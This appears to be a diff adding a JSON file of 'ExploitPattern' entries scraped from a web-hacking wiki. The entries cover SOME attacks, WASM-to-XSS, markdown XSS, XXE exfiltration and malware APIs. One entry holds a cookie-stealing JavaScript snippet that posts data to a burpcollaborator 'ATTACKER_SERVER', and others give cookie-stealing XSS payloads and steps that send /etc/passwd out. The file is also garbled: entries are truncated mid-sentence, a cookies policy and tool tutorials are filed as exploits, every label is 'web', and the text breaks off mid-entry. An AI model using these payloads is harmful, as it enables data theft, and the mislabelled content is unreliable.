@@ -1,0 +1,1156 @@
+[
+  {
+    "id": "general-692",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "SOME - Same Origin Method Execution",
+    "description": "There will be occasions where you can execute some limited javascript in a page. For example, in the case where you can[ **control a callback value that will be executed**](#javascript-function). In those case, one of the best things that you could do is to **access the DOM to call whatever** sensitive action you can find in there (like clicking a button). However, usually you will find this vulnerability in **small endpoints without any interesting thing in the DOM**. In those scenarios, this attack will be very useful, because its goal is to be able to **abuse the limited JS execution inside a DOM from a different page from the same domain** with much interesting actions.",
+    "techniques": [
+      "Find a **callback that you can abuse** (potentially limited to \\[\\w\\\\.\\_]).",
+      "If it's not limited and you can execute any JS, you could just abuse this as a regular XSS",
+      "Make the **victim open a page** controlled by the **attacker**",
+      "The **page will open itself** in a **different window** (the new window will have the object **`opener`** referencing the initial one)",
+      "The **initial page** will load the **page** where the **interesting DOM** is located.",
+      "The **second page** will load the **vulnerable page abusing the callback** and using the **`opener`** object to **access and execute some action in the initial page** (which now contains the interesting DOM).",
+      "You can use this form to **generate a PoC** to exploit this type of vulnerability: [https://www.someattack.com/Playground/SOMEGenerator](https://www.someattack.com/Playground/SOMEGenerator)",
+      "In order to find a DOM path to a HTML element with a click you can use this browser extension: [https://www.someattack.com/Playground/targeting_tool](https://www.someattack.com/Playground/targeting_tool)",
+      "You can find a vulnerable example in [https://www.someattack.com/Playground/](https://www.someattack.com/Playground/)",
+      "Note that in this example the server is **generating javascript code** and **adding** it to the HTML based on the **content of the callback parameter:** `opener.{callbacl_content}` . Thats why in this example you don't need to indicate the use of `opener` explicitly.",
+      "Also check this CTF writeup: [https://ctftime.org/writeup/36068](https://ctftime.org/writeup/36068)"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-693",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Steal Info JS",
+    "description": "// SELECT HERE THE EXFILTRATION MODE (more than 1 can be selected) // If any GET method is selected (like location or RQ_GET), it's recommended to exfiltrate each info 1 by 1 \"https://weecosb5a2k7jc0cwlyksg9qzh57tw.burpcollaborator.net\" var EXFIL_BY_FETCH_POST = false var ALL_INFO = \"\" // Only used by Location exfiltration // Function to make the data possible to transmit via either GET or POST // Functions to exfiltrate the information function exfil_info(info_name, text, is_final = false) { if (EXFIL_BY_IMG) exfil_by_img(info_name, text)",
+    "techniques": [
+      "var ATTACKER_SERVER =",
+      "\"https://weecosb5a2k7jc0cwlyksg9qzh57tw.burpcollaborator.net\"",
+      "var EXFIL_BY_IMG = false",
+      "var EXFIL_BY_RQ_GET = false",
+      "var EXFIL_BY_RQ_POST = true",
+      "var EXFIL_BY_FETCH_GET = false",
+      "var EXFIL_BY_FETCH_POST = false",
+      "var EXFIL_BY_NAV = false",
+      "var EXFIL_BY_LOC = false",
+      "var ALL_INFO = \"\" // Only used by Location exfiltration",
+      "function encode(text) {",
+      "return encodeURI(btoa(text))",
+      "function exfil_info(info_name, text, is_final = false) {",
+      "if (EXFIL_BY_IMG) exfil_by_img(info_name, text)",
+      "if (EXFIL_BY_RQ_GET) exfil_by_rq_get(info_name, text)",
+      "if (EXFIL_BY_RQ_POST) exfil_by_rq_post(info_name, text)",
+      "if (EXFIL_BY_FETCH_GET) exfil_by_fetch_get(info_name, text)",
+      "if (EXFIL_BY_FETCH_POST) exfil_by_fetch_post(info_name, text)",
+      "if (EXFIL_BY_NAV) exfil_by_nav(info_name, text)",
+      "if (EXFIL_BY_LOC) {"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-694",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "WebAssembly linear memory corruption to DOM XSS (template overwrite)",
+    "description": "This technique shows how a memory-corruption bug inside a WebAssembly (WASM) module compiled with Emscripten can be weaponized into a reliable DOM XSS even when input is sanitized. The pivot is to corrupt writable constants in WASM linear memory (e.g., HTML format templates) instead of attacking the sanitized source string. Key idea: In the WebAssembly model, code lives in non-writable executable pages, but the module’s data (heap/stack/globals/\"constants\") live in a single flat linear memory (pages of 64KB) that is writable by the module. If buggy C/C++ code writes out-of-bounds, you can overwrite adjacent objects and even constant strings embedded in linear memory. When such a constant is later used to build HTML for insertion via a DOM sink, you can turn sanitized input into executable ",
+    "techniques": [
+      "Web app uses Emscripten glue (Module.cwrap) to call into a WASM module.",
+      "Application state lives in WASM linear memory (e.g., C structs with pointers/lengths to user buffers).",
+      "Input sanitizer encodes metacharacters before storage, but later rendering builds HTML using a format string stored in WASM linear memory.",
+      "There is a linear-memory corruption primitive (e.g., heap overflow, UAF, or unchecked memcpy).",
+      "addMsg(): allocates a new buffer sized to the sanitized input and appends a msg to s.mess, doubling capacity with realloc when needed.",
+      "editMsg(): re-sanitizes and memcpy’s the new bytes into the existing buffer without ensuring the new length ≤ old allocation → intra‑linear‑memory heap overflow.",
+      "populateMsgHTML(): formats sanitized text with a baked stub like \"%.*s\" residing in linear memory. The returned HTML lands in a DOM sink (e.g., innerHTML).",
+      "Send enough messages to exceed the initial capacity. After growth, realloc() often places s->mess immediately after the last user buffer in linear memory.",
+      "Overflow the last message via editMsg() to clobber fields inside s->mess (e.g., overwrite msg_data pointers) → arbitrary pointer rewrite within linear memory for data later rendered.",
+      "Sanitization protects input, not sinks. Find the format stub used by populateMsgHTML(), e.g.:",
+      "\"%.*s\" → change to \"\"",
+      "Locate the stub deterministically by scanning linear memory; it is a plain byte string within Module.HEAPU8.",
+      "After you overwrite the stub, sanitized message content becomes the JavaScript handler for onerror, so adding a new message with text like alert(1337) yields  and executes immediately in the DOM.",
+      "Break on the first Module.cwrap call in the JS glue and step into the wasm call site to capture pointer arguments (numeric offsets into linear memory).",
+      "Use typed views like Module.HEAPU8 to read/write WASM memory from the console.",
+      "Helper snippets:",
+      "WASM prevents code execution from linear memory, but constant data inside linear memory is writable if program logic is buggy.",
+      "The sanitizer only protects the source string; by corrupting the sink (the HTML template), sanitized input becomes the JS handler value and executes when inserted into the DOM.",
+      "realloc()-driven adjacency plus unchecked memcpy in edit flows enables pointer corruption to redirect writes to attacker-chosen addresses within linear memory.",
+      "Any in-memory HTML template, JSON skeleton, or URL pattern embedded in linear memory can be targeted to change how sanitized data is interpreted downstream."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-695",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "XSS in Markdown",
+    "description": "If you have the chance to inject code in markdown, there are a few options you can use to trigger a XSS when the code gets interpreted. The most common way to get XSS in markdown is to inject common HTML tags that execute javascript, because several makdown interpreters will also accept HTML You can find more examples in the [main XSS page of hacktricks](README.md). If HTML tags aren't an option you could always try to play with markdown syntax: [a](javascript:prompt(document.cookie)) [Basic](javascript:alert('Basic')) [Local",
+    "techniques": [
+      "You can find more examples in the [main XSS page of hacktricks](README.md).",
+      "If HTML tags aren't an option you could always try to play with markdown syntax:",
+      "The following code is **sanitising HTML input** and then **passing it to the markdown parser**, then, XSS can be triggered abusing miss-interpretations between Markdown and DOMPurify",
+      "Payloads example:",
+      "Use gopher to send arbitrary requests to internal services with arbitrary data:"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-696",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "XSSI (Cross-Site Script Inclusion)",
+    "description": "**Cross-Site Script Inclusion (XSSI)** is a vulnerability that arises from the nature of the `script` tag in HTML. Unlike most resources, which are subject to the **Same-Origin Policy (SOP)**, scripts can be included from different domains. This behavior is intended to facilitate the use of libraries and other resources hosted on different servers but also introduces a potential security risk. - **Bypass of SOP**: Scripts are exempt from the **Same-Origin Policy**, allowing them to be included across domains.",
+    "techniques": [
+      "Bypass of SOP: Scripts are exempt from the Same-Origin Policy, allowing them to be included across domains.",
+      "Data Exposure: An attacker can exploit this behavior to read data loaded via the `script` tag.",
+      "Impact on Dynamic JavaScript/JSONP: XSSI is particularly relevant for dynamic JavaScript or JSON with Padding (JSONP). These technologies often use \"ambient-authority\" information (like cookies) for authentication. When a script request is made to a different host, these credentials (e.g., cookies) are automatically included in the request.",
+      "Authentication Token Leakage: If an attacker can trick a user's browser into requesting a script from a server they control, they might be able to access sensitive information contained in these requests.",
+      "Further details on attack vectors can be found in the work of Security Researcher [Sebastian Lekies](https://twitter.com/slekies), who maintains a list of [vectors](http://sebastian-lekies.de/leak/)."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "xxe-697",
+    "type": "ExploitPattern",
+    "category": "XXE",
+    "title": "XXE - XEE - XML External Entity",
+    "description": "XML is a markup language designed for data storage and transport, featuring a flexible structure that allows for the use of descriptively named tags. It differs from HTML by not being limited to a set of predefined tags. XML's significance has declined with the rise of JSON, despite its initial role in AJAX technology. - **Data Representation through Entities**: Entities in XML enable the representation of data, including special characters like `&lt;` and `&gt;`, which correspond to `` to avoid conflict with XML's tag system.",
+    "techniques": [
+      "Data Representation through Entities: Entities in XML enable the representation of data, including special characters like `&lt;` and `&gt;`, which correspond to `` to avoid conflict with XML's tag system.",
+      "Defining XML Elements: XML allows for the definition of element types, outlining how elements should be structured and what content they may contain, ranging from any type of content to specific child elements.",
+      "Document Type Definition (DTD): DTDs are crucial in XML for defining the document's structure and the types of data it can contain. They can be internal, external, or a combination, guiding how documents are formatted and validated.",
+      "Custom and External Entities: XML supports the creation of custom entities within a DTD for flexible data representation. External entities, defined with a URL, raise security concerns, particularly in the context of XML External Entity (XXE) attacks, which exploit the way XML parsers handle external data sources: ` ]>`",
+      "XXE Detection with Parameter Entities: For detecting XXE vulnerabilities, especially when conventional methods fail due to parser security measures, XML parameter entities can be utilized. These entities allow for out-of-band detection techniques, such as triggering DNS lookups or HTTP requests to a controlled domain, to confirm the vulnerability.",
+      "An XML parameter entity, `%file`, is created, reading the content of the `/etc/hostname` file.",
+      "Another XML parameter entity, `%eval`, is defined. It dynamically declares a new XML parameter entity, `%exfiltrate`. The `%exfiltrate` entity is set to make an HTTP request to the attacker's server, passing the content of the `%file` entity within the query string of the URL.",
+      "The `%eval` entity is utilized, leading to the execution of the dynamic declaration of the `%exfiltrate` entity.",
+      "The `%exfiltrate` entity is then used, triggering an HTTP request to the specified URL with the file's contents.",
+      "The definition of an XML parameter entity named `local_dtd` includes the external DTD file located on the server's filesystem.",
+      "A redefinition occurs for the `custom_entity` XML parameter entity, originally defined in the external DTD, to encapsulate an [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). This redefinition is designed to elicit a parsing error, exposing the contents of the `/etc/passwd` file.",
+      "By employing the `local_dtd` entity, the external DTD is engaged, encompassing the newly defined `custom_entity`. This sequence of actions precipitates the emission of the error message aimed for by the exploit.",
+      "Redefines the undefined entity so that it:",
+      "Reads the target file (``).",
+      "Builds another parameter entity that refers to an **invalid path** containing the `%flag;` value and triggers a parser error (`\">`).",
+      "Parameter entities are still expanded by libxml2 even when `resolve_entities` should block XXE.",
+      "An **invalid URI** or **non-existent file** is enough to concatenate controlled data into the thrown exception.",
+      "The technique works **without outbound connectivity**, making it ideal for strictly egress-filtered environments.",
+      "Upgrade to **lxml ≥ 5.4.0** and ensure the underlying **libxml2** is **≥ 2.13.8**.",
+      "Disable `load_dtd` and/or `resolve_entities` unless absolutely required."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "xxe"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "api-698",
+    "type": "ExploitPattern",
+    "category": "API",
+    "title": "Common API used in Malware",
+    "description": "| Raw Sockets   | WinAPI Sockets | | ------------- | -------------- | | socket()      | WSAStratup()   | | bind()        | bind()         | | listen()      | listen()       | | accept()      | accept()       | | connect()     | connect()      | | read()/recv() | recv()         | | write()       | send()         | | shutdown()    | WSACleanup()   | Many loaders wrap their TCP stream in `SslStream` and pin the server’s leaf certificate against an embedded copy (certificate pinning). Bot info/tasks are compressed (e.g., GZip). When responses exceed a threshold (~1 MB), data is fragmented into small chunks (e.g., 16 KB segments) to avoid size-based heuristics and reduce memory spikes during deserialisation.",
+    "techniques": [
+      "`GetKeyboardLayout` to enumerate installed layouts (per-thread/user)",
+      "`GetLocaleInfoA/W` to resolve country/region codes",
+      "`GetSystemDefaultLangID` / `GetUserDefaultLangID`",
+      "Flag processes that query multiple locale/keyboard APIs early in execution then exit with no observable activity.",
+      "Correlate with anti-VM checks (BIOS strings, PnP devices, disk model, services) reused from open-source projects (e.g., VMDetector) to catch gated execution.",
+      "`MpVmp32Entry`, `MpVmp32FastEnter`, `MpCallPreEntryPointCode`, `MpCallPostEntryPointCode`, `MpFinalize`, `MpReportEvent*`, `MpSwitchToNextThread*`",
+      "`VFS_*` family: `VFS_Open`, `VFS_Read`, `VFS_MapViewOfFile`, `VFS_UnmapViewOfFile`, `VFS_FindFirstFile/FindNextFile`, `VFS_CopyFile`, `VFS_DeleteFile`, `VFS_MoveFile`",
+      "`ThrdMgr_*`: `ThrdMgr_GetCurrentThreadHandle`, `ThrdMgr_SaveTEB`, `ThrdMgr_SwitchThreads`",
+      "Operators sometimes require a benign-looking CLI switch to be present before running the payload (e.g., `/i:--type=renderer` to mimic Chromium child processes). If the switch is absent, the loader exits immediately, hindering naive sandbox execution.",
+      "GetAsyncKeyState() -- Key logging",
+      "SetWindowsHookEx -- Key logging",
+      "GetForeGroundWindow -- Get running window name (or the website from a browser)",
+      "LoadLibrary() -- Import library",
+      "GetProcAddress() -- Import library",
+      "CreateToolhelp32Snapshot() -- List running processes",
+      "GetDC() -- Screenshot",
+      "BitBlt() -- Screenshot",
+      "InternetOpen(), InternetOpenUrl(), InternetReadFile(), InternetWriteFile() -- Access the Internet",
+      "FindResource(), LoadResource(), LockResource() -- Access resources of the executable",
+      "The loader picked `RegAsm.exe` (part of the .NET Framework) as host – a signed binary unlikely to draw attention."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "api"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-699",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Angr - Examples",
+    "description": "> If the program is using `scanf` to get **several values at once from stdin** you need to generate a state that starts after the **`scanf`**. Codes taken from [https://github.com/jakespringer/angr_ctf](https://github.com/jakespringer/angr_ctf) path_to_binary = argv[1]  # :string project = angr.Project(path_to_binary) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find=good_address, avoid=avoid_address) solution_state = simulation.found[0]",
+    "techniques": [
+      "import angr",
+      "import sys",
+      "def main(argv):",
+      "path_to_binary = argv[1]  # :string",
+      "project = angr.Project(path_to_binary)",
+      "initial_state = project.factory.entry_state()",
+      "simulation = project.factory.simgr(initial_state)",
+      "good_address = 0x804867d",
+      "avoid_address = 0x080485A8",
+      "simulation.explore(find=good_address, avoid=avoid_address)",
+      "if simulation.found:",
+      "solution_state = simulation.found[0]",
+      "print(solution_state.posix.dumps(sys.stdin.fileno()))",
+      "raise Exception('Could not find the solution')",
+      "if __name__ == '__main__':",
+      "main(sys.argv)",
+      "path_to_binary = argv[1]",
+      "def is_successful(state):",
+      "stdout_output = state.posix.dumps(sys.stdout.fileno())",
+      "return b'Good Job.' in stdout_output"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-700",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Blobrunner",
+    "description": "The only modified line from the [original code](https://github.com/OALabs/BlobRunner) is the line 10. In order to compile it just **create a C/C++ project in Visual Studio Code, copy and paste the code and build it**. const char* _version = \"0.0.5\"; const char* _banner = \" __________.__        ___.  __________\\n\" \" \\\\______   \\\\  |   ____\\\\_ |__\\\\______   \\\\__ __  ____   ____   ___________     \\n\" \"  |    |  _/  |  /  _ \\\\| __ \\\\|       _/  |  \\\\/    \\\\ /    \\\\_/ __ \\\\_  __ \\\\  \\n\" \"  |    |   \\\\  |_(   ) \\\\_\\\\ \\\\    |   \\\\  |  /   |  \\\\   |  \\\\  ___/|  | \\\\/ \\n\"",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-701",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Cheat Engine",
+    "description": "[**Cheat Engine**](https://www.cheatengine.org/downloads.php) is a useful program to find where important values are saved inside the memory of a running game and change them.\\ When you download and run it, you are **presented** with a **tutorial** of how to use the tool. If you want to learn how to use the tool it's highly recommended to complete it. This tool is very useful to find **where some value** (usually a number) **is stored in the memory** of a program.\\ **Usually numbers** are stored in **4bytes** form, but you could also find them in **double** or **float** formats, or you may want to look for something **different from a number**. For that reason you need to be sure you **select** what you want to **search for**:",
+    "techniques": [
+      "`Pointers must end with specific offsets` and the new **Deviation** slider (≥7.4) greatly reduce false positives when you rescan after an update. Use it together with multi-map comparison (`.PTR` → *Compare results with other saved pointer map*) to obtain a **single resilient base-pointer** in just a few minutes.",
+      "Bulk-filter shortcut: after the first scan press `Ctrl+A → Space` to mark everything, then `Ctrl+I` (invert) to deselect addresses that failed the rescan.",
+      "Patch Scanner (MemView → Tools) – detects unexpected code changes in executable sections; handy for malware analysis.",
+      "Structure Dissector 2 – drag-an-address → `Ctrl+D`, then *Guess fields* to auto-evaluate C-structures.",
+      ".NET & Mono Dissector – improved Unity game support; call methods directly from the CE Lua console.",
+      "Big-Endian custom types – reversed byte order scan/edit (useful for console emulators and network packet buffers).",
+      "Autosave & tabs for AutoAssembler/Lua windows, plus `reassemble()` for multi-line instruction rewrite.",
+      "The official installer is wrapped with InnoSetup **ad-offers** (`RAV` etc.). **Always click *Decline*** *or compile from source* to avoid PUPs. AVs will still flag `cheatengine.exe` as a *HackTool*, which is expected.",
+      "Modern anti-cheat drivers (EAC/Battleye, ACE-BASE.sys, mhyprot2.sys) detect CE’s window class even when renamed. Run your reversing copy **inside a disposable VM** or after disabling network play.",
+      "If you only need user-mode access choose **`Settings → Extra → Kernel mode debug = off`** to avoid loading CE’s unsigned driver that may BSOD on Windows 11 24H2 Secure-Boot.",
+      "Cheat Engine tutorial, complete it to learn how to start with Cheat Engine",
+      "Memory View → Tools → Ultimap 3 → check «Intel PT»",
+      "Select number of buffers → Start",
+      "./ceserver_arm64 &",
+      "adb forward tcp:52736 tcp:52736   # (or ssh tunnel)",
+      "Cheat Engine → \"Network\" icon → Host = localhost → Connect"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-702",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Satisfiability Modulo Theories (SMT) - Z3",
+    "description": "Very basically, this tool will help us to find values for variables that need to satisfy some conditions and calculating them by hand will be so annoying. Therefore, you can indicate to Z3 the conditions the variables need to satisfy and it will find some values (if possible). **Some texts and examples are extracted from [https://ericpony.github.io/z3py-tutorial/guide-examples.htm](https://ericpony.github.io/z3py-tutorial/guide-examples.htm)** s = Solver() #The solver will be given the conditions",
+    "techniques": [
+      "`>>` is an **arithmetic** right shift for bit-vectors. Use `LShR` for the logical `shr` instruction.",
+      "Use `UDiv`, `URem`, `ULT`, `ULE`, `UGT` and `UGE` when the original comparison/division was **unsigned**.",
+      "Keep widths explicit. If the binary truncates to 8 or 16 bits, add `Extract` or rebuild the value with `Concat` instead of silently promoting everything to Python integers.",
+      "from z3 import *",
+      "s = Solver() #The solver will be given the conditions",
+      "x = Bool(\"x\") #Declare the symbos x, y and z",
+      "y = Bool(\"y\")",
+      "z = Bool(\"z\")",
+      "s.add(And(Or(x,y,Not(z)),y))",
+      "s.check() #If response is \"sat\" then the model is satifable, if \"unsat\" something is wrong",
+      "print(s.model()) #Print valid values to satisfy the model",
+      "x = Int('x')",
+      "y = Int('y')",
+      "print(simplify(And(x + 1 >= 3, x**2 + x**2 + y**2 + 2 >= 5)))",
+      "r1 = Real('r1')",
+      "r2 = Real('r2')",
+      "print(solve(r1**2 + r2**2 == 3, r1**3 == 2))",
+      "set_option(precision=30)",
+      "x, y, z = Reals('x y z')",
+      "s = Solver()"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-703",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Word Macros",
+    "description": "It's very common to find **junk code that is never used** to make the reversing of the macro more difficult.\\ For example, in the following image you can see that and If that is never going to be true is used to execute some junk and useless code. Using the **GetObject** function it's possible to obtain data from forms of the macro. This can be used to difficult the analysis. The following is a photo of a macro form used to **hide data inside text boxes** (a text box can be hiding other text boxes):",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-704",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Android Forensics",
+    "description": "To start extracting data from an Android device it has to be unlocked. If it's locked you can: - Check if the device has debugging via USB activated. - Check for a possible [smudge attack](https://www.usenix.org/legacy/event/woot10/tech/full_papers/Aviv.pdf) - Try with [Brute-force](https://www.cultofmac.com/316532/this-brute-force-device-can-crack-any-iphones-pin-code/) Create an [android backup using adb](../mobile-pentesting/android-app-pentesting/adb-commands.md#backup) and extract it using [Android Backup Extractor](https://sourceforge.net/projects/adbextractor/): `java -jar abe.jar unpack file.backup file.tar`",
+    "techniques": [
+      "Check if the device has debugging via USB activated.",
+      "Check for a possible [smudge attack](https://www.usenix.org/legacy/event/woot10/tech/full_papers/Aviv.pdf)",
+      "Try with [Brute-force](https://www.cultofmac.com/316532/this-brute-force-device-can-crack-any-iphones-pin-code/)",
+      "`cat /proc/partitions` (search the path to the flash memory, generally the first entry is _mmcblk0_ and corresponds to the whole flash memory).",
+      "`df /data` (Discover the block size of the system).",
+      "dd if=/dev/block/mmcblk0 of=/sdcard/blk0.img bs=4096 (execute it with the information gathered from the block size)."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-705",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Burp Suite",
+    "description": "- **Simple List:** Just a list containing an entry in each line - **Runtime File:** A list read in runtime (not loaded in memory). For supporting big lists. - **Case Modification:** Apply some changes to a list of strings(No change, to lower, to UPPER, to Proper name - First capitalized and the rest to lower-, to Proper Name -First capitalized an the rest remains the same-. - **Numbers:** Generate numbers from X to Y using Z step or randomly. - **Brute Forcer:** Character set, min & max length. [https://github.com/0xC01DF00D/Collabfiltrator](https://github.com/0xC01DF00D/Collabfiltrator) : Payload to execute commands and grab the output via DNS requests to burpcollab.",
+    "techniques": [
+      "Simple List: Just a list containing an entry in each line",
+      "Runtime File: A list read in runtime (not loaded in memory). For supporting big lists.",
+      "Case Modification: Apply some changes to a list of strings(No change, to lower, to UPPER, to Proper name - First capitalized and the rest to lower-, to Proper Name -First capitalized an the rest remains the same-.",
+      "Numbers: Generate numbers from X to Y using Z step or randomly.",
+      "Brute Forcer: Character set, min & max length."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-706",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Cookies Policy",
+    "description": "This Cookies Policy applies to the following websites owned and operated by HackTricks team (\"HackTricks\", \"we\", \"us\" or \"our\"): * [www.hacktricks.wiki](https://www.hacktricks.wiki/) By using any of these websites, you agree to the use of cookies in accordance with this Cookies Policy. If you do not agree, please disable cookies in your browser settings or refrain from using our websites. Cookies are small text files that are stored on your computer or mobile device when you visit a website. They are widely used to make websites work, improve their functionality, and provide a more personalized user experience.",
+    "techniques": [
+      "hacktricks.wiki",
+      "book.hacktricks.wiki",
+      "cloud.hacktricks.wiki"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-707",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Fault Injection Attacks",
+    "description": "Fault injections attacks includes introducing external distrubance in electronic circuits to influence it's behaviour, resulting to disclose information or even bypass certian restrictions in the circuit. This attacks opens a lot of possibilities for attacking electronic circuits. This attack is also referred as glitching of electronic circuits. There are a lot of methods and mediums for injecting fault into an electronic circuit.",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-708",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "I2C",
+    "description": "To test a Bus Pirate is working, connect +5V with VPU and 3.3V with ADC and access the bus pirate (Using Tera Term for example) and use the command `~`: Connect (Vpu to +5V) and (ADC to +3.3V) MODE and VREG LEDs should be on! As you can see in the previous command line it said that it found 0 errors. This is very useful to know it's working after buying it or after flashing a firmware. To connect with the bus pirate you can follow the docs: In this case I'm going to connect to an EPROM: ATMEL901 24C256 PU27:",
+    "techniques": [
+      "Disconnect any devices",
+      "Connect (Vpu to +5V) and (ADC to +3.3V)",
+      "Space to continue",
+      "AUX OK",
+      "MODE LED OK",
+      "PULLUP H OK",
+      "PULLUP L OK",
+      "VREG OK",
+      "ADC and supply",
+      "5V(4.96) OK",
+      "VPU(4.96) OK",
+      "3.3V(3.26) OK",
+      "ADC(3.27) OK",
+      "Bus high",
+      "MOSI OK",
+      "CLK OK",
+      "MISO OK",
+      "Bus Hi-Z 0",
+      "Bus Hi-Z 1",
+      "MODE and VREG LEDs should be on!"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-709",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "JTAG",
+    "description": "[**JTAGenum**](https://github.com/cyphunk/JTAGenum) is a tool you can load on an Arduino-compatible MCU or (experimentally) a Raspberry Pi to brute‑force unknown JTAG pinouts and even enumerate instruction registers. - Arduino: connect digital pins D2–D11 to up to 10 suspected JTAG pads/testpoints, and Arduino GND to target GND. Power the target separately unless you know the rail is safe. Prefer 3.3 V logic (e.g., Arduino Due) or use a level shifter/series resistors when probing 1.8–3.3 V targets.",
+    "techniques": [
+      "Arduino: connect digital pins D2–D11 to up to 10 suspected JTAG pads/testpoints, and Arduino GND to target GND. Power the target separately unless you know the rail is safe. Prefer 3.3 V logic (e.g., Arduino Due) or use a level shifter/series resistors when probing 1.8–3.3 V targets.",
+      "Raspberry Pi: the Pi build exposes fewer usable GPIOs (so scans are slower); check the repo for the current pin map and constraints.",
+      "`l` find loopbacks to avoid false positives",
+      "`r` toggle internal pull‑ups if needed",
+      "`s` scan for TCK/TMS/TDI/TDO (and sometimes TRST/SRST)",
+      "`y` brute‑force IR to discover undocumented opcodes",
+      "`x` boundary‑scan snapshot of pin states",
+      "Always share ground, and never drive unknown pins above target Vtref. If in doubt, add 100–470 Ω series resistors on candidate pins.",
+      "If the device uses SWD/SWJ instead of 4‑wire JTAG, JTAGenum may not detect it; try SWD tools or an adapter that supports SWJ‑DP.",
+      "Identify Vtref and GND first with a multimeter. Many adapters need Vtref to set I/O voltage.",
+      "Level shifting: prefer bidirectional level shifters designed for push‑pull signals (JTAG lines are not open‑drain). Avoid auto‑direction I2C shifters for JTAG.",
+      "Useful adapters: FT2232H/FT232H boards (e.g., Tigard), CMSIS‑DAP, J‑Link, ST‑LINK (vendor‑specific), ESP‑USB‑JTAG (on ESP32‑Sx). Connect at minimum TCK, TMS, TDI, TDO, GND and Vtref; optionally TRST and SRST.",
+      "Generic example with a J‑Link:",
+      "ESP32‑S3 built‑in USB‑JTAG (no external probe required):",
+      "If you get \"all ones/zeros\" IDCODE, check wiring, power, Vtref, and that the port isn’t locked by fuses/option bytes.",
+      "See OpenOCD low‑level `irscan`/`drscan` for manual TAP interaction when bringing up unknown chains.",
+      "Generic target after init:",
+      "RISC‑V SoC (prefer SBA when available):",
+      "ESP32‑S3, program or read via OpenOCD helper:",
+      "Use `mdw/mdh/mdb` to sanity‑check memory before long dumps."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-710",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Radio",
+    "description": "[**SigDigger** ](https://github.com/BatchDrake/SigDigger)is a free digital signal analyzer for GNU/Linux and macOS, designed to extract information of unknown radio signals. It supports a variety of SDR devices through SoapySDR, and allows adjustable demodulation of FSK, PSK and ASK signals, decode analog video, analyze bursty signals and listen to analog voice channels (all in real time). After installing there are a few things that you could consider configuring.\\ In settings (the second tab button) you can select the **SDR device** or **select a file** to read and which frequency to syntonise and the Sample rate (recommended to up to 2.56Msps if your PC support it)",
+    "techniques": [
+      "Just to **capture some time of a signal and analyze it** just maintain the button \"Push to capture\" as long as you need.",
+      "The **Tuner** of SigDigger helps to **capture better signals** (but it can also degrade them). Ideally start with 0 and keep **making it bigger until** you find the **noise** introduce is **bigger** than the **improvement of the signal** you need).",
+      "When a device is sending bursts of information, usually the **first part is going to be a preamble** so you **don't** need to **worry** if you **don't find information** in there **or if there are some errors** there.",
+      "In frames of information you usually should **find different frames well aligned between them**:",
+      "After recovering the bits you might need to process them someway. For example, in Manchester codification a up+down will be a 1 or 0 and a down+up will be the other one. So pairs of 1s and 0s (ups and downs) will be a real 1 or a real 0.",
